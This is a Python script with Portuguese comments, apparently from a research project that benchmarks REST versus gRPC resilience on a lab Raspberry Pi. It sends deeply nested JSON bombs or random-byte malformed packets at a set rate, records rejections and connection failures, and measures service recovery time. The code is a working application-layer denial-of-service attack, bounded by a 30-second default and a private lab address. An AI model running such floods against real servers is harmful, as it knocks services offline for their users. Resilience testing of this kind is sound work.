"""
Atacante L7 - ETAPA 5 (JSON Bomb / pacote malformado, cenarios C3/C4 do artigo).
Roda NO NOTEBOOK. Manda payloads maliciosos (JSON profundamente aninhado ou
bytes aleatorios) contra o servidor REST ou gRPC, numa taxa/duracao
configuraveis, medindo taxa de rejeicao e - se acontecer - o tempo ate a
conexao cair (proxy pratico para "tempo ate falha/OOM Kill" sem precisar
instrumentar o processo do servidor diretamente).

NAO modifica servers/rest_server.py nem servers/grpc_server.py - mede a
resiliencia do codigo como esta, nao adiciona defesa (isso descaracterizaria
o teste do RQ3).

Rode metrics/coletor_recursos.py no Pi, em paralelo, pra ter a curva de
CPU/RAM durante o ataque.

Executar (de qualquer diretorio):
    python3 atacante_l7.py 192.168.50.1 --alvo rest --payload jsonbomb
    python3 atacante_l7.py 192.168.50.1 --alvo rest --payload malformado --seguranca mtls
    python3 atacante_l7.py 192.168.50.1 --alvo grpc --payload jsonbomb
    python3 atacante_l7.py 192.168.50.1 --alvo grpc --payload malformado --seguranca mtls

--duracao default 30s (limite de seguranca - nao roda indefinidamente).
--taxa default 100 req/s (Tabela 5 do artigo, meta - a taxa real alcancada
e sempre reportada, pode ficar abaixo disso, principalmente no gRPC com
mTLS, onde cada tentativa faz um handshake novo).
--profundidade default 100 (profundidade do JSON bomb, so usado com
--payload jsonbomb).

Nota sobre o alvo gRPC: a lib grpc so permite enviar mensagens Protobuf
validas via stub, entao simular "lixo" de verdade exige ir por baixo do
nivel da lib - aqui e feito com socket bruto na porta 50051 (com o mesmo
handshake TLS/mTLS de metrics/medir_handshake.py, se aplicavel), mandando
os bytes do payload diretamente, sem framing HTTP/2 valido. Isso testa se a
pilha HTTP/2 do gRPC rejeita lixo rapidamente - nao testa especificamente
"payload Protobuf invalido dentro de um frame HTTP/2 valido" (isso exigiria
implementar o framing com a lib h2, fica como melhoria futura).

ETAPA 5 (C5) - ataque + rede degradada simultaneos: se o ataque terminar
por erro de conexao (nao por ter batido o --duracao), este script sonda
sozinho ate o servico voltar, medindo o "tempo de recuperacao". Pra isso
ter efeito (o servico realmente voltar sozinho), suba o servidor via
metrics/supervisor.sh em vez de chamar rest_server.py/grpc_server.py
direto. C3+C4 "simultaneos" e so rodar duas instancias deste script ao
mesmo tempo (uma --payload jsonbomb, outra --payload malformado), contra
o mesmo servidor.
"""
import argparse
import csv
import os
import socket
import ssl
import time
from pathlib import Path

import httpx

_PADRAO_PKI = Path(__file__).resolve().parent.parent / "pki-scripts" / "pki"


def gerar_json_bomb_texto(profundidade: int) -> bytes:
    """
    Monta o JSON aninhado como TEXTO puro (concatenacao de string, sem
    recursao) em vez de construir um dict e deixar o json.dumps() do
    Python serializar - json.dumps() tambem e recursivo e bate no limite
    de recursao do Python (1000 por padrao) em profundidades mais altas,
    o que faria o proprio atacante quebrar antes de mandar o payload
    (foi exatamente isso que aconteceu testando profundidade >= 1000).
    Construindo o texto diretamente, o atacante consegue mandar qualquer
    profundidade - o limite (se houver) passa a ser so do lado do servidor.
    """
    abre = '{"x":' * profundidade
    fecha = "null" + ("}" * profundidade)
    return (abre + fecha).encode("utf-8")


def gerar_bytes_aleatorios(tamanho: int = 512) -> bytes:
    return os.urandom(tamanho)


def montar_cliente_http(seguranca: str, pki: Path) -> httpx.Client:
    if seguranca == "none":
        return httpx.Client(timeout=5.0, http2=True)
    ca_crt = pki / "ca.crt"
    if not ca_crt.exists():
        raise FileNotFoundError(f"ca.crt nao encontrado em {pki}")
    if seguranca == "tls":
        return httpx.Client(timeout=5.0, http2=True, verify=str(ca_crt))
    client_crt = pki / "client.crt"
    client_key = pki / "client.key"
    if not client_crt.exists() or not client_key.exists():
        raise FileNotFoundError(f"client.crt/client.key nao encontrados em {pki}")
    return httpx.Client(
        timeout=5.0, http2=True, verify=str(ca_crt),
        cert=(str(client_crt), str(client_key)),
    )


def montar_contexto_tls(seguranca: str, pki: Path):
    if seguranca == "none":
        return None
    ca_crt = pki / "ca.crt"
    if not ca_crt.exists():
        raise FileNotFoundError(f"ca.crt nao encontrado em {pki}")
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.load_verify_locations(cafile=str(ca_crt))
    if seguranca == "mtls":
        client_crt = pki / "client.crt"
        client_key = pki / "client.key"
        if not client_crt.exists() or not client_key.exists():
            raise FileNotFoundError(f"client.crt/client.key nao encontrados em {pki}")
        ctx.load_cert_chain(certfile=str(client_crt), keyfile=str(client_key))
    return ctx


def atacar_rest(ip, payload_tipo, profundidade, taxa, duracao, seguranca, pki):
    esquema = "http" if seguranca == "none" else "https"
    url = f"{esquema}://{ip}:8000/telemetria"
    cliente = montar_cliente_http(seguranca, pki)

    headers = {"Content-Type": "application/json"}
    if payload_tipo == "jsonbomb":
        corpo_bytes = gerar_json_bomb_texto(profundidade)
    else:
        corpo_bytes = gerar_bytes_aleatorios()

    resultados = []
    intervalo = 1.0 / taxa
    inicio_total = time.perf_counter()
    i = 0
    with cliente as c:
        while time.perf_counter() - inicio_total < duracao:
            inicio = time.perf_counter()
            try:
                r = c.post(url, content=corpo_bytes, headers=headers)
                fim = time.perf_counter()
                estado = "sucesso" if r.status_code == 200 else f"rejeitado_{r.status_code}"
                resultados.append((i, fim - inicio_total, estado, (fim - inicio) * 1000))
            except Exception as e:
                fim = time.perf_counter()
                resultados.append((i, fim - inicio_total, f"erro_conexao:{type(e).__name__}", (fim - inicio) * 1000))
                print(f"  conexao perdida na tentativa {i} (t={fim - inicio_total:.1f}s): {e}")
                break
            i += 1
            atraso = intervalo - (time.perf_counter() - inicio)
            if atraso > 0:
                time.sleep(atraso)
    return resultados


def _ler_ate_fechar(conn, timeout_leitura=1.0, limite_bytes=65536):
    """
    Le do socket ate a conexao fechar (peer encerrou) ou parar de mandar
    dado por 'timeout_leitura' segundos. O gRPC manda um frame SETTINGS
    HTTP/2 assim que aceita a conexao, ANTES de validar o que o cliente
    mandou - um unico recv() curto pega so isso, nao a rejeicao de verdade
    que vem depois. Por isso aqui a leitura continua ate ficar claro que
    acabou (conexao fechada) ou parou de chegar coisa nova.
    """
    conn.settimeout(timeout_leitura)
    dados = b""
    fechou = False
    while len(dados) < limite_bytes:
        try:
            pedaco = conn.recv(4096)
        except (socket.timeout, ssl.SSLError):
            break
        if not pedaco:
            fechou = True
            break
        dados += pedaco
    return dados, fechou


def _contem_frame_tipo(dados: bytes, tipo: int) -> bool:
    """Percorre frames HTTP/2 (cabecalho de 9 bytes: 3 tamanho + 1 tipo +
    1 flags + 4 stream id) procurando um tipo especifico - 0x03=RST_STREAM,
    0x07=GOAWAY (os dois sinalizam recusa/encerramento pelo peer)."""
    i = 0
    while i + 9 <= len(dados):
        tamanho = int.from_bytes(dados[i:i + 3], "big")
        if dados[i + 3] == tipo:
            return True
        i += 9 + tamanho
    return False


def atacar_grpc(ip, payload_tipo, profundidade, taxa, duracao, seguranca, pki):
    porta = 50051
    if payload_tipo == "jsonbomb":
        payload = gerar_json_bomb_texto(profundidade)
    else:
        payload = gerar_bytes_aleatorios()

    contexto = montar_contexto_tls(seguranca, pki)

    resultados = []
    intervalo = 1.0 / taxa
    inicio_total = time.perf_counter()
    i = 0
    while time.perf_counter() - inicio_total < duracao:
        inicio = time.perf_counter()
        try:
            with socket.create_connection((ip, porta), timeout=5) as sock:
                if contexto is not None:
                    with contexto.wrap_socket(sock, server_hostname=ip) as tls:
                        tls.send(payload)
                        resposta, fechou = _ler_ate_fechar(tls)
                else:
                    sock.send(payload)
                    resposta, fechou = _ler_ate_fechar(sock)
            fim = time.perf_counter()
            if fechou:
                estado = "rejeitado_conexao_fechada"
            elif _contem_frame_tipo(resposta, 0x07) or _contem_frame_tipo(resposta, 0x03):
                estado = "rejeitado_goaway_ou_rst"
            elif resposta:
                estado = "resposta_recebida_sem_rejeicao_explicita"
            else:
                estado = "sem_resposta_sem_fechar"
            resultados.append((i, fim - inicio_total, estado, (fim - inicio) * 1000))
        except Exception as e:
            fim = time.perf_counter()
            resultados.append((i, fim - inicio_total, f"erro_conexao:{type(e).__name__}", (fim - inicio) * 1000))
            print(f"  conexao perdida na tentativa {i} (t={fim - inicio_total:.1f}s): {e}")
            break
        i += 1
        atraso = intervalo - (time.perf_counter() - inicio)
        if atraso > 0:
            time.sleep(atraso)
    return resultados


def sondar_recuperacao(alvo, ip, seguranca, pki, teto_segundos=120.0, intervalo=0.5):
    """
    ETAPA 5 (C5) - depois que o ataque termina por erro de conexao (nao por
    ter batido o --duracao), fica tentando reconectar ate o servico voltar
    (ou ate o teto de seguranca), medindo o "tempo de recuperacao". So faz
    um health-check leve (REST: GET /status; gRPC: so a conexao/handshake),
    nao um ataque de verdade.
    """
    inicio = time.perf_counter()
    if alvo == "rest":
        esquema = "http" if seguranca == "none" else "https"
        url = f"{esquema}://{ip}:8000/status"
        try:
            cliente = montar_cliente_http(seguranca, pki)
        except FileNotFoundError:
            return None
        with cliente as c:
            while time.perf_counter() - inicio < teto_segundos:
                try:
                    r = c.get(url, timeout=2.0)
                    if r.status_code == 200:
                        return time.perf_counter() - inicio
                except Exception:
                    pass
                time.sleep(intervalo)
        return None

    # grpc
    try:
        contexto = montar_contexto_tls(seguranca, pki)
    except FileNotFoundError:
        return None
    while time.perf_counter() - inicio < teto_segundos:
        try:
            with socket.create_connection((ip, 50051), timeout=2) as sock:
                if contexto is not None:
                    with contexto.wrap_socket(sock, server_hostname=ip):
                        pass
            return time.perf_counter() - inicio
        except Exception:
            pass
        time.sleep(intervalo)
    return None


def main():
    parser = argparse.ArgumentParser(description="Atacante L7 - JSON Bomb / pacote malformado (Etapa 5)")
    parser.add_argument("ip", help="IP do Raspberry Pi")
    parser.add_argument("--alvo", choices=["rest", "grpc"], required=True)
    parser.add_argument("--payload", choices=["jsonbomb", "malformado"], required=True)
    parser.add_argument("--taxa", type=float, default=100.0, help="Requisicoes por segundo, meta (Tabela 5 do artigo)")
    parser.add_argument("--duracao", type=float, default=30.0, help="Duracao maxima do ataque em segundos")
    parser.add_argument("--profundidade", type=int, default=100, help="Profundidade do JSON bomb")
    parser.add_argument("--seguranca", choices=["none", "tls", "mtls"], default="none")
    parser.add_argument("--pki", default=None, help="Pasta com os certificados")
    parser.add_argument(
        "--rede", choices=["direto", "3g", "4g", "lte"], default="direto",
        help="So para nomear o arquivo de saida - o perfil em si e aplicado no Pi via "
             "netem/aplicar_perfil.sh, antes de rodar este ataque.",
    )
    args = parser.parse_args()

    pki_dir = Path(args.pki) if args.pki else _PADRAO_PKI

    print(f">> Atacando {args.alvo} com payload '{args.payload}' por ate {args.duracao:.0f}s "
          f"a ~{args.taxa:.0f} req/s [seguranca={args.seguranca}, rede={args.rede}]")

    try:
        if args.alvo == "rest":
            resultados = atacar_rest(
                args.ip, args.payload, args.profundidade, args.taxa, args.duracao, args.seguranca, pki_dir,
            )
        else:
            resultados = atacar_grpc(
                args.ip, args.payload, args.profundidade, args.taxa, args.duracao, args.seguranca, pki_dir,
            )
    except FileNotFoundError as e:
        print(e)
        print("Gere a PKI primeiro: bash pki-scripts/gerar_pki.sh")
        return

    if not resultados:
        print("Nenhuma tentativa registrada.")
        return

    total = len(resultados)
    duracao_real = resultados[-1][1]
    sucesso = sum(1 for r in resultados if r[2] == "sucesso")
    rejeitado = sum(1 for r in resultados if str(r[2]).startswith("rejeitado"))
    ambiguo = sum(1 for r in resultados if r[2] == "resposta_recebida_sem_rejeicao_explicita")
    sem_resposta = sum(1 for r in resultados if r[2] == "sem_resposta_sem_fechar")
    erro = sum(1 for r in resultados if str(r[2]).startswith("erro_conexao"))

    print("\n=== RESULTADO DO ATAQUE ===")
    print(f"  tentativas: {total}  (duracao real: {duracao_real:.1f}s, taxa real: {total / duracao_real:.1f} req/s)")
    print(f"  sucesso (200): {sucesso}")
    print(f"  rejeitado (4xx/5xx / GOAWAY-RST / conexao fechada): {rejeitado}")
    if ambiguo:
        print(f"  AMBIGUO (recebeu resposta mas sem sinal claro de rejeicao - conferir manualmente): {ambiguo}")
    if sem_resposta:
        print(f"  sem resposta e sem fechar (timeout de leitura): {sem_resposta}")
    print(f"  erro de conexao: {erro}")
    if erro > 0:
        primeiro_erro = next(r for r in resultados if str(r[2]).startswith("erro_conexao"))
        print(f"  >> primeira falha de conexao em t={primeiro_erro[1]:.1f}s (tentativa {primeiro_erro[0]})")
        print("     possivel sinal de falha/OOM do servidor - confira o servidor e o coletor de recursos no Pi.")
        print("     sondando recuperacao (C5)... (roda com metrics/supervisor.sh pro servidor voltar sozinho)")
        tempo_recuperacao = sondar_recuperacao(args.alvo, args.ip, args.seguranca, pki_dir)
        if tempo_recuperacao is not None:
            print(f"     >> RECUPEROU em {tempo_recuperacao:.1f}s apos a falha (tempo-ate-recuperacao)")
        else:
            print("     >> NAO recuperou dentro do teto de seguranca (120s) - confira o Pi manualmente.")

    nome_saida = f"ataque_{args.alvo}_{args.payload}.csv"
    if args.rede != "direto":
        nome_saida = nome_saida.replace(".csv", f"_{args.rede}.csv")
    if args.seguranca != "none":
        nome_saida = nome_saida.replace(".csv", f"_{args.seguranca}.csv")
    with open(nome_saida, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["indice", "tempo_s", "resultado", "latencia_ms"])
        for idx, t, resultado, lat in resultados:
            w.writerow([idx, f"{t:.3f}", resultado, f"{lat:.3f}"])
    print(f"\n  detalhes salvos em {nome_saida}")


if __name__ == "__main__":
    main()
